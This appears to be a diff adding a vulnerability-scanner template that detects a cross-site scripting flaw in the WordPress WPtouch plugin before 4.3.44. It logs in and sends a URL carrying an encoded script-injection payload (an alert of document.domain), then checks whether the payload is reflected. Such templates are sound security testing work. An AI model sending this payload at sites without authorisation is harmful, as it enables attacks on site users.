@@ -1,0 +1,55 @@
+id: wptouch-xss
+
+info:
+  name: WordPress WPtouch <4.3.44 - Cross-Site Scripting
+  author: akincibor
+  severity: medium
+  description: |
+    WordPress WPtouch plugin prior to 4.3.44 contains a cross-site scripting vulnerability. The plugin does not escape some URLs before outputting them back in attributes. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+  reference:
+    - https://wpscan.com/vulnerability/7dbd8348-9c5d-4d62-a0f4-2b7c2b7e58e4
+    - https://wordpress.org/plugins/wptouch/advanced/
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 5.4
+    cwe-id: CWE-80
+  metadata:
+    max-request: 2
+  tags: wp-plugin,wp,wordpress,xss,authenticated,wptouch,wpscan
+
+http:
+  - raw:
+      - |
+        POST /wp-login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
+      - |
+        GET /wp-admin/admin.php?page=wptouch-admin-license&a%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"><script>alert(document.domain)</script>'
+
+      - type: word
+        part: body
+        words:
+          - 'WPtouchCustom'
+          - 'WPtouchAjax'
+          - 'toplevel_page_wptouch-admin'
+        condition: or
+
+      - type: word
+        part: header
+        words:
+          - text/html
+
+      - type: status
+        status:
+          - 200
+# digest: 4b0a004830460221009607fd9d34a7ed5e4b5813f5f3be9c221a079a0347e4ae860e6fedffaa911d38022100acd634c38db17c7873cb7dfa41eaaf72f32b00d1c463b6093053460bdf2e666a:922c64590222798bb761d5b6d8e72950
